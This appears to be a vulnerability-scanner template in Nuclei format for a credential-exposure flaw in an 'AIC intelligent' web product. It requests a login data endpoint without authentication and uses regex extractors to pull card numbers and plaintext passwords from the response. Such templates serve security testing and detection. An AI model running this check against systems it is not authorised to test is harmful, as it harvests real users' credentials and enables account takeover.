http:
- extractors:
  - group: 1
    name: username
    part: body
    regex:
    - "\"\u5361\u53F7\":\"(.*?)\""
    type: regex
  - group: 1
    name: passwd
    part: body
    regex:
    - "\"\u5BC6\u7801\":\"(.*?)\""
    type: regex
  matchers:
  - condition: and
    dsl:
    - "status_code == 200 && contains(body_1,\"\u5361\u53F7\\\":\\\"\") && contains(body_1,\"\
      \u5BC6\u7801\\\":\\\"\")"
    type: dsl
  method: GET
  path:
  - '{{BaseURL}}/datacenter/dataOrigin.ashx?c=login'
id: aic-intelligent-password-exposure
